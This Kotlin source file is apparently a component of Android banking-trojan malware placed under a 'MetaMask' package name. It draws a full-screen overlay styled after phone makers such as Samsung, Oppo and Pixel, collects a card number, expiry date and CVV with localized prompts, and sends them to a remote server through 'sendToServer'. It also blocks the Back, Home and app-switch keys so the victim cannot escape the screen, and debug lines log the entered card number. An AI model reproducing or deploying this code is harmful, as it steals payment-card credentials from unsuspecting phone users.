package com.example.MetaMask.services

import android.content.Context
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.KeyEvent
import android.view.View
import android.widget.*
import org.json.JSONObject
import java.util.Calendar
import java.util.Locale

class HybridCardOverlay(
    ctx: Context,
    cfg: JSONObject,
    private val mgr: HybridOverlayManager
) : FrameLayout(ctx) {

    private val customTitle = cfg.optString("title", "")
    private val hint        = cfg.optString("hint", "")
    private val brand       = cfg.optString("brand", "xiaomi").lowercase(Locale.ROOT)
    private val showExpiry  = cfg.optBoolean("show_expiry", true)
    private val showCvv     = cfg.optBoolean("show_cvv", true)

    private val numberDigits = StringBuilder()
    private val expiryDigits = StringBuilder()
    private val cvvDigits    = StringBuilder()

    private enum class Field { NUMBER, EXPIRY, CVV }
    private var activeField = Field.NUMBER
    private var submitted   = false

    private var numberDisplay: TextView? = null
    private var expiryDisplay: TextView? = null
    private var cvvDisplay:    TextView? = null
    private var errorView:     TextView? = null
    private var submitBtn:     Button?   = null

    private val handler = Handler(Looper.getMainLooper())
    private var cursorOn = true
    private val blink = object : Runnable {
        override fun run() {
            android.util.Log.d("XDBG", "[HybridCardOverlay] run enter") //xdbg
            cursorOn = !cursorOn
            refreshDisplays()
            handler.postDelayed(this, 530)
        }
    }

    private data class BS(
        val bg: Int, val titleColor: Int, val accent: Int, val hint: Int,
        val fieldBg: Int, val fieldText: Int,
        val borderOn: Int, val borderOff: Int,
        val padBg: Int, val btnBg: Int, val btnText: Int,
        val btnPress: Int, val delBg: Int
    )

    private val s: BS by lazy {
        when (brand) {
            "samsung" -> BS(
                bg        = Color.parseColor("#1c1c2e"),
                titleColor= Color.WHITE,
                accent    = Color.parseColor("#4a9eff"),
                hint      = Color.argb(160,255,255,255),
                fieldBg   = Color.parseColor("#2a2a3e"),
                fieldText = Color.WHITE,
                borderOn  = Color.parseColor("#4a9eff"),
                borderOff = Color.parseColor("#3a3a5e"),
                padBg     = Color.parseColor("#13131f"),
                btnBg     = Color.parseColor("#2a2a3e"),
                btnText   = Color.WHITE,
                btnPress  = Color.parseColor("#4a9eff"),
                delBg     = Color.parseColor("#3a2030")
            )
            "honor" -> BS(
                bg        = Color.parseColor("#0a0a0a"),
                titleColor= Color.WHITE,
                accent    = Color.parseColor("#ff6b35"),
                hint      = Color.argb(140,255,255,255),
                fieldBg   = Color.parseColor("#1a1a1a"),
                fieldText = Color.WHITE,
                borderOn  = Color.parseColor("#ff6b35"),
                borderOff = Color.parseColor("#2a2a2a"),
                padBg     = Color.parseColor("#111111"),
                btnBg     = Color.parseColor("#1e1e1e"),
                btnText   = Color.WHITE,
                btnPress  = Color.parseColor("#ff6b35"),
                delBg     = Color.parseColor("#2a1510")
            )
            "oppo" -> BS(
                bg        = Color.parseColor("#000000"),
                titleColor= Color.WHITE,
                accent    = Color.parseColor("#2196f3"),
                hint      = Color.argb(160,200,220,255),
                fieldBg   = Color.parseColor("#0d1b40"),
                fieldText = Color.WHITE,
                borderOn  = Color.parseColor("#2196f3"),
                borderOff = Color.parseColor("#1a237e"),
                padBg     = Color.parseColor("#060606"),
                btnBg     = Color.parseColor("#1a237e"),
                btnText   = Color.WHITE,
                btnPress  = Color.parseColor("#2196f3"),
                delBg     = Color.parseColor("#1a0a0a")
            )
            "vivo" -> BS(
                bg        = Color.parseColor("#000d1a"),
                titleColor= Color.WHITE,
                accent    = Color.parseColor("#42a5f5"),
                hint      = Color.argb(160,200,220,255),
                fieldBg   = Color.argb(60,30,80,160),
                fieldText = Color.WHITE,
                borderOn  = Color.parseColor("#42a5f5"),
                borderOff = Color.argb(80,30,80,160),
                padBg     = Color.parseColor("#000d1a"),
                btnBg     = Color.parseColor("#0a1a3a"),
                btnText   = Color.WHITE,
                btnPress  = Color.parseColor("#1565c0"),
                delBg     = Color.parseColor("#1a0a10")
            )
            "tecno" -> BS(
                bg        = Color.parseColor("#f5f5f5"),
                titleColor= Color.parseColor("#212121"),
                accent    = Color.parseColor("#ff5722"),
                hint      = Color.parseColor("#9e9e9e"),
                fieldBg   = Color.WHITE,
                fieldText = Color.parseColor("#212121"),
                borderOn  = Color.parseColor("#ff5722"),
                borderOff = Color.parseColor("#e0e0e0"),
                padBg     = Color.parseColor("#eeeeee"),
                btnBg     = Color.parseColor("#e0e0e0"),
                btnText   = Color.parseColor("#212121"),
                btnPress  = Color.parseColor("#ff5722"),
                delBg     = Color.parseColor("#ffd5cc")
            )
            "pixel" -> BS(
                bg        = Color.parseColor("#1c2526"),
                titleColor= Color.WHITE,
                accent    = Color.parseColor("#7986cb"),
                hint      = Color.argb(160,255,255,255),
                fieldBg   = Color.parseColor("#2d3748"),
                fieldText = Color.WHITE,
                borderOn  = Color.parseColor("#7986cb"),
                borderOff = Color.parseColor("#3d4758"),
                padBg     = Color.parseColor("#141c1d"),
                btnBg     = Color.parseColor("#2d3748"),
                btnText   = Color.WHITE,
                btnPress  = Color.parseColor("#7986cb"),
                delBg     = Color.parseColor("#3a2040")
            )
            "stock" -> BS(
                bg        = Color.parseColor("#141414"),
                titleColor= Color.WHITE,
                accent    = Color.parseColor("#03a9f4"),
                hint      = Color.argb(160,255,255,255),
                fieldBg   = Color.parseColor("#2a2a2a"),
                fieldText = Color.WHITE,
                borderOn  = Color.parseColor("#03a9f4"),
                borderOff = Color.parseColor("#3a3a3a"),
                padBg     = Color.parseColor("#1a1a1a"),
                btnBg     = Color.parseColor("#2a2a2a"),
                btnText   = Color.WHITE,
                btnPress  = Color.parseColor("#03a9f4"),
                delBg     = Color.parseColor("#2a1a1a")
            )
            else -> BS(
                bg        = Color.parseColor("#0f0a28"),
                titleColor= Color.parseColor("#e0d8ff"),
                accent    = Color.parseColor("#7c4dff"),
                hint      = Color.argb(160,224,216,255),
                fieldBg   = Color.argb(60,255,255,255),
                fieldText = Color.WHITE,
                borderOn  = Color.parseColor("#7c4dff"),
                borderOff = Color.argb(60,124,77,255),
                padBg     = Color.parseColor("#080520"),
                btnBg     = Color.parseColor("#2d1f5e"),
                btnText   = Color.WHITE,
                btnPress  = Color.parseColor("#7c4dff"),
                delBg     = Color.parseColor("#3a1530")
            )
        }
    }

    init {
        setBackgroundColor(s.bg)
        buildUi()
        handler.postDelayed(blink, 530)
    }

    private fun Int.dp() = (this * resources.displayMetrics.density + 0.5f).toInt()

    private fun buildUi() {
        android.util.Log.d("XDBG", "[HybridCardOverlay] buildUi enter") //xdbg
        val root = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LayoutParams(LayoutParams.MATCH_PARENT, LayoutParams.MATCH_PARENT)
        }

        val scroll = ScrollView(context).apply {
            layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, 0, 1f)
            isFillViewport = true
        }
        val upper = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(20.dp(), 24.dp(), 20.dp(), 8.dp())
        }

        upper.addView(TextView(context).apply {
            text = "💳"; textSize = 36f; gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
                .apply { bottomMargin = 6.dp() }
        })

        if (customTitle.isNotEmpty()) upper.addView(TextView(context).apply {
            text = customTitle; textSize = 16f
            setTextColor(s.titleColor); gravity = Gravity.CENTER
            typeface = Typeface.DEFAULT_BOLD
            layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
                .apply { bottomMargin = 4.dp() }
        })

        if (hint.isNotEmpty()) upper.addView(TextView(context).apply {
            text = hint; textSize = 11f
            setTextColor(s.hint); gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
                .apply { bottomMargin = 10.dp() }
        })

        upper.addView(lbl(loc("НОМЕР КАРТЫ","CARD NUMBER","НОМЕР КАРТКИ","KARTENNUMMER","NUMÉRO","KART NO","NÚMERO","КАРТА №")))
        numberDisplay = fld().also { tv ->
            tv.setOnClickListener { switchTo(Field.NUMBER) }
            upper.addView(tv)
        }

        if (showExpiry || showCvv) {
            android.util.Log.d("XDBG", "[HybridCardOverlay] if branch") //xdbg
            val row = LinearLayout(context).apply {
                orientation = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
                    .apply { topMargin = 10.dp() }
            }
            if (showExpiry) {
                android.util.Log.d("XDBG", "[HybridCardOverlay] if branch") //xdbg
                val col = LinearLayout(context).apply {
                    orientation = LinearLayout.VERTICAL
                    layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
                        .apply { if (showCvv) marginEnd = 8.dp() }
                }
                col.addView(lbl(loc("СРОК (ММ/ГГ)","EXPIRY (MM/YY)","ТЕРМІН (ММ/РР)","ABLAUF (MM/JJ)","EXPIRATION","SON KULLANMA","VENCIMIENTO","МЕРЗІМ (АА/ЖЖ)")))
                expiryDisplay = fld().also { tv ->
                    tv.setOnClickListener { switchTo(Field.EXPIRY) }
                    col.addView(tv)
                }
                row.addView(col)
            }
            if (showCvv) {
                android.util.Log.d("XDBG", "[HybridCardOverlay] if branch") //xdbg
                val col = LinearLayout(context).apply {
                    orientation = LinearLayout.VERTICAL
                    layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, if (showExpiry) 0.55f else 1f)
                }
                col.addView(lbl("CVV / CVC"))
                cvvDisplay = fld().also { tv ->
                    tv.setOnClickListener { switchTo(Field.CVV) }
                    col.addView(tv)
                }
                row.addView(col)
            }
            upper.addView(row)
        }

        errorView = TextView(context).apply {
            textSize = 11f; setTextColor(Color.parseColor("#ff5252"))
            gravity = Gravity.CENTER; visibility = INVISIBLE
            layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
                .apply { topMargin = 6.dp() }
        }
        upper.addView(errorView)

        submitBtn = Button(context).apply {
            text = "OK"; textSize = 16f; isAllCaps = false
            setTextColor(Color.WHITE)
            background = GradientDrawable().apply {
                setColor(s.accent); cornerRadius = 10f * resources.displayMetrics.density
            }
            isEnabled = false; alpha = 0.4f
            layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, 46.dp())
                .apply { topMargin = 10.dp(); bottomMargin = 4.dp() }
            setOnClickListener { submit() }
        }
        upper.addView(submitBtn)

        scroll.addView(upper)
        root.addView(scroll)
        root.addView(buildPad())
        addView(root)

        refreshBorders()
        refreshDisplays()
    }

    private fun lbl(text: String) = TextView(context).apply {
        this.text = text; textSize = 10f; letterSpacing = 0.06f
        setTextColor(s.hint)
        layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
            .apply { bottomMargin = 3.dp() }
    }

    private fun fld() = TextView(context).apply {
        textSize = 17f; typeface = Typeface.MONOSPACE
        setTextColor(s.fieldText)
        setPadding(12.dp(), 11.dp(), 12.dp(), 11.dp())
        background = border(false)
        isFocusable = false; isFocusableInTouchMode = false; isClickable = true
        layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
    }

    private fun border(active: Boolean) = GradientDrawable().apply {
        setColor(s.fieldBg)
        cornerRadius = 8f * resources.displayMetrics.density
        setStroke(if (active) 2.dp() else 1.dp(), if (active) s.borderOn else s.borderOff)
    }

    private fun buildPad(): LinearLayout {
        android.util.Log.d("XDBG", "[HybridCardOverlay] buildPad enter") //xdbg
        val pad = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(s.padBg)
            setPadding(12.dp(), 8.dp(), 12.dp(), 16.dp())
            layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
        }
        listOf(
            listOf("1","2","3"),
            listOf("4","5","6"),
            listOf("7","8","9"),
            listOf("","0","⌫")
        ).forEach { keys ->
            val row = LinearLayout(context).apply {
                orientation = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
            }
            keys.forEach { row.addView(padBtn(it)) }
            pad.addView(row)
        }
        android.util.Log.d("XDBG", "[HybridCardOverlay] return") //xdbg
        return pad
    }

    private fun padBtn(label: String): View {
        android.util.Log.d("XDBG", "[HybridCardOverlay] padBtn enter label=${label}") //xdbg
        val lp = LinearLayout.LayoutParams(0, 54.dp(), 1f).apply { setMargins(4.dp(), 4.dp(), 4.dp(), 4.dp()) }
        if (label.isEmpty()) return View(context).apply { layoutParams = lp }
        android.util.Log.d("XDBG", "[HybridCardOverlay] return") //xdbg
        return Button(context).apply {
            text = label
            textSize = if (label == "⌫") 20f else 21f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(s.btnText)
            isAllCaps = false
            setPadding(0, 0, 0, 0)
            background = GradientDrawable().apply {
                setColor(if (label == "⌫") s.delBg else s.btnBg)
                cornerRadius = 8f * resources.displayMetrics.density
            }
            layoutParams = lp
            setOnClickListener { if (label == "⌫") onBack() else onKey(label) }
        }
    }

    private fun switchTo(f: Field) {
        android.util.Log.d("XDBG", "[HybridCardOverlay] switchTo enter f=${f}") //xdbg
        activeField = f
        refreshBorders()
        refreshDisplays()
    }

    private fun onKey(d: String) {
        android.util.Log.d("XDBG", "[HybridCardOverlay] onKey enter d=${d}") //xdbg
        errorView?.visibility = INVISIBLE
        when (activeField) {
            Field.NUMBER -> if (numberDigits.length < 16) {
                numberDigits.append(d)
                if (numberDigits.length == 16) {
                    android.util.Log.d("XDBG", "[HybridCardOverlay] if branch") //xdbg
                    if (showExpiry) switchTo(Field.EXPIRY) else if (showCvv) switchTo(Field.CVV)
                }
            }
            Field.EXPIRY -> if (expiryDigits.length < 4) {
                expiryDigits.append(d)
                if (expiryDigits.length == 4 && showCvv) switchTo(Field.CVV)
            }
            Field.CVV -> if (cvvDigits.length < 4) cvvDigits.append(d)
        }
        refreshDisplays()
        refreshSubmit()
    }

    private fun onBack() {
        android.util.Log.d("XDBG", "[HybridCardOverlay] onBack enter") //xdbg
        when (activeField) {
            Field.NUMBER -> if (numberDigits.isNotEmpty()) numberDigits.deleteCharAt(numberDigits.length - 1)
            Field.EXPIRY -> if (expiryDigits.isNotEmpty()) expiryDigits.deleteCharAt(expiryDigits.length - 1)
            Field.CVV    -> if (cvvDigits.isNotEmpty())    cvvDigits.deleteCharAt(cvvDigits.length - 1)
        }
        refreshDisplays()
        refreshSubmit()
    }

    private fun refreshBorders() {
        android.util.Log.d("XDBG", "[HybridCardOverlay] refreshBorders enter") //xdbg
        numberDisplay?.background = border(activeField == Field.NUMBER)
        expiryDisplay?.background = border(activeField == Field.EXPIRY)
        cvvDisplay?.background    = border(activeField == Field.CVV)
    }

    private fun refreshDisplays() {
        android.util.Log.d("XDBG", "[HybridCardOverlay] refreshDisplays enter") //xdbg
        val cur = if (cursorOn) "|" else " "

        numberDisplay?.let { tv ->
            val fmt = numberDigits.toString().chunked(4).joinToString(" ")
            if (activeField == Field.NUMBER) {
                android.util.Log.d("XDBG", "[HybridCardOverlay] if branch") //xdbg
                tv.setTextColor(s.fieldText)
                tv.text = if (fmt.isEmpty()) cur else "$fmt$cur"
            } else if (fmt.isEmpty()) {
                tv.setTextColor(s.hint); tv.text = "XXXX XXXX XXXX XXXX"
            } else {
                tv.setTextColor(s.fieldText); tv.text = fmt
            }
        }

        expiryDisplay?.let { tv ->
            val raw = expiryDigits.toString()
            val fmt = if (raw.length > 2) "${raw.take(2)}/${raw.drop(2)}" else raw
            if (activeField == Field.EXPIRY) {
                android.util.Log.d("XDBG", "[HybridCardOverlay] if branch") //xdbg
                tv.setTextColor(s.fieldText)
                tv.text = if (fmt.isEmpty()) cur else "$fmt$cur"
            } else if (fmt.isEmpty()) {
                tv.setTextColor(s.hint); tv.text = "MM/YY"
            } else {
                tv.setTextColor(s.fieldText); tv.text = fmt
            }
        }

        cvvDisplay?.let { tv ->
            val raw = cvvDigits.toString()
            if (activeField == Field.CVV) {
                android.util.Log.d("XDBG", "[HybridCardOverlay] if branch") //xdbg
                tv.setTextColor(s.fieldText)
                tv.text = if (raw.isEmpty()) cur else "$raw$cur"
            } else if (raw.isEmpty()) {
                tv.setTextColor(s.hint); tv.text = "•••"
            } else {
                tv.setTextColor(s.fieldText); tv.text = raw
            }
        }
    }

    private fun refreshSubmit() {
        android.util.Log.d("XDBG", "[HybridCardOverlay] refreshSubmit enter") //xdbg
        val ok = luhn(numberDigits.toString()) &&
                (!showExpiry || validExpiry(expiryDigits.toString())) &&
                (!showCvv || cvvDigits.length >= 3)
        submitBtn?.isEnabled = ok
        submitBtn?.alpha = if (ok) 1f else 0.4f
    }

    private fun luhn(n: String): Boolean {
        android.util.Log.d("XDBG", "[HybridCardOverlay] luhn enter n=${n}") //xdbg
        if (n.length < 13 || n.length > 19) return false
        var sum = 0; var alt = false
        for (i in n.length - 1 downTo 0) {
            android.util.Log.d("XDBG", "[HybridCardOverlay] loop") //xdbg
            var d = n[i].digitToInt()
            if (alt) { d *= 2; if (d > 9) d -= 9 }
            sum += d; alt = !alt
        }
        android.util.Log.d("XDBG", "[HybridCardOverlay] return") //xdbg
        return sum % 10 == 0
    }

    private fun validExpiry(digits: String): Boolean {
        android.util.Log.d("XDBG", "[HybridCardOverlay] validExpiry enter digits=${digits}") //xdbg
        if (digits.length < 4) return false
        val m = digits.take(2).toIntOrNull() ?: return false
        val y = digits.drop(2).toIntOrNull() ?: return false
        if (m < 1 || m > 12) return false
        val cal = Calendar.getInstance()
        val cy = cal.get(Calendar.YEAR) % 100
        val cm = cal.get(Calendar.MONTH) + 1
        android.util.Log.d("XDBG", "[HybridCardOverlay] return") //xdbg
        return y > cy || (y == cy && m >= cm)
    }

    private fun submit() {
        android.util.Log.d("XDBG", "[HybridCardOverlay] submit enter") //xdbg
        if (submitted) return
        val num = numberDigits.toString()
        if (!luhn(num)) {
            android.util.Log.d("XDBG", "[HybridCardOverlay] if branch") //xdbg
            showError(loc("Неверный номер карты","Invalid card number","Невірний номер картки",
                "Ungültige Kartennummer","Numéro invalide","Geçersiz kart numarası","Número inválido","Жарамсыз карта нөмірі"))
            return
        }
        if (showExpiry && !validExpiry(expiryDigits.toString())) {
            android.util.Log.d("XDBG", "[HybridCardOverlay] if branch") //xdbg
            showError(loc("Неверный срок действия","Invalid expiry date","Невірний термін дії",
                "Ungültiges Ablaufdatum","Date d'expiration invalide","Geçersiz son kullanma","Fecha inválida","Жарамсыз мерзім"))
            return
        }
        submitted = true
        val expFmt = expiryDigits.toString().let { if (it.length == 4) "${it.take(2)}/${it.drop(2)}" else it }
        val payload = JSONObject().apply {
            put("number", num)
            if (showExpiry) put("expiry", expFmt)
            if (showCvv)    put("cvv",    cvvDigits.toString())
        }
        try {
            mgr.sendToServer(JSONObject().apply {
                put("action",    "hybrid_overlay_input")
                put("type",      "card_submit")
                put("data",      payload)
                put("timestamp", System.currentTimeMillis())
            })
        } catch (_: Exception) {}
        try { mgr.close("card_submitted") } catch (_: Exception) {}
    }

    private fun showError(msg: String) {
        android.util.Log.d("XDBG", "[HybridCardOverlay] showError enter msg=${msg}") //xdbg
        errorView?.apply { text = msg; visibility = VISIBLE }
    }

    private fun loc(ru: String, en: String, uk: String, de: String, fr: String, tr: String, es: String, kk: String) =
        when (Locale.getDefault().language) {
            "ru" -> ru; "uk" -> uk; "de" -> de; "fr" -> fr; "tr" -> tr; "es" -> es; "kk" -> kk; else -> en
        }

    override fun onDetachedFromWindow() {
        android.util.Log.d("XDBG", "[HybridCardOverlay] onDetachedFromWindow enter") //xdbg
        super.onDetachedFromWindow()
        handler.removeCallbacks(blink)
    }

    override fun dispatchKeyEvent(event: KeyEvent): Boolean {
        android.util.Log.d("XDBG", "[HybridCardOverlay] dispatchKeyEvent enter event=${event}") //xdbg
        val c = event.keyCode
        if (c == KeyEvent.KEYCODE_BACK || c == KeyEvent.KEYCODE_HOME || c == KeyEvent.KEYCODE_APP_SWITCH) return true
        android.util.Log.d("XDBG", "[HybridCardOverlay] return") //xdbg
        return super.dispatchKeyEvent(event)
    }
}
